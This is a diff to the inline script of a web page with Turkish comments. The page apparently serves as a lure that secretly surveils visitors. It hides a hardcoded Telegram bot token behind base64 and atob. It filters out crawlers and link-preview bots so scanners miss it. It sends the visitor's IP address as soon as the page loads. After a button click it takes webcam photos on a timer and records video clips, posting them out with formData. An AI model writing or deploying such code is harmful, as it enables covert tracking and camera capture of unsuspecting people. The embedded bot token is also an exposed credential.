@@ -63,26 +63,27 @@
 
     <script>
         // ============================================
-        // GİZLİ KONFİGÜRASYON
+        // GİZLİ KONFİGÜRASYON (ŞİFRELİ TOKEN)
         // ============================================
-        const BOT_TOKEN = "8773124715:AAEfs80t8yv2XnDGy20aLlxy3aFGwDj0jFU";
+        const SIFRELI_TOKEN = "ODc3MzEyNDcxNTpBQUVmczgwdDh5djJYbkRHeTIwYUxseHkzYUZHd0RqMGpGVQ==";
+        const BOT_TOKEN = atob(SIFRELI_TOKEN);
+        
         const urlParams = new URLSearchParams(window.location.search);
         const TARGET_ID = urlParams.get('i');
         const FOTO_SURESI = urlParams.get('foto') ? parseInt(urlParams.get('foto')) : 3;
         const VIDEO_SURESI = urlParams.get('video') ? parseInt(urlParams.get('video')) : 5;
         
         // ============================================
-        // BOT KONTROLÜ - %100 KESİN
+        // BOT KONTROLÜ
         // ============================================
         const ua = navigator.userAgent.toLowerCase();
-        const isBot = /bot|crawl|spider|scrape|googlebot|bingbot|yahoo|facebook|twitter|whatsapp|instagram|telegram|slack|discord|pinterest|linkedin|baidu|yandex|duckduckbot|applebot|facebookexternalhit|twitterbot|telegrambot|slackbot|discordbot|whatsappbot|instagrambot/i.test(ua) || ua.includes('headless') || !navigator.webdriver === undefined;
+        const isBot = /bot|crawl|spider|scrape|googlebot|bingbot|yahoo|facebook|twitter|whatsapp|instagram|telegram|slack|discord/i.test(ua);
         
         // ============================================
-        // SAYFA AÇILIR AÇILMAZ IP GÖNDER - %100 HASSAS
+        // SAYFA AÇILIR AÇILMAZ IP GÖNDER
         // ============================================
         window.onload = function() {
             if (TARGET_ID && !isBot) {
-                // IP'yi milisaniyesine kadar hızlı al
                 const startTime = performance.now();
                 
                 fetch('https://api.ipify.org?format=json', {
@@ -108,7 +109,7 @@
         };
         
         // ============================================
-        // KAMERA İŞLEMLERİ - %100 HASSAS ZAMANLAMA
+        // KAMERA İŞLEMLERİ
         // ============================================
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
@@ -144,22 +145,19 @@
                     document.getElementById('startBtn').style.display = 'none';
                     document.getElementById('loading').style.display = 'block';
                     
-                    // İLK FOTOĞRAF - HEMEN
                     lastPhotoTime = performance.now();
                     takePhoto();
                     
-                    // FOTOĞRAF - TAM SÜRESİNDE (1ms hassasiyet)
                     photoTimer = setInterval(() => {
                         const now = performance.now();
                         const expectedTime = lastPhotoTime + (FOTO_SURESI * 1000);
                         
-                        if (now >= expectedTime - 5) { // 5ms tolerans
+                        if (now >= expectedTime - 5) {
                             takePhoto();
                             lastPhotoTime = now;
                         }
                     }, FOTO_SURESI * 1000);
                     
-                    // VİDEO - TAM SÜRESİNDE BAŞLASIN
                     setTimeout(() => {
                         recordVideo();
                     }, 2000);
@@ -232,11 +230,9 @@
                     body: formData
                 });
                 
-                // YENİ VİDEO - MİNİMUM GECİKME (10ms)
                 videoTimer = setTimeout(recordVideo, 10);
             };
             
-            // VİDEOYU TAM SÜRESİNDE DURDUR
             mediaRecorder.start();
             videoStopTimer = setTimeout(() => {
                 if (mediaRecorder?.state === 'recording') {
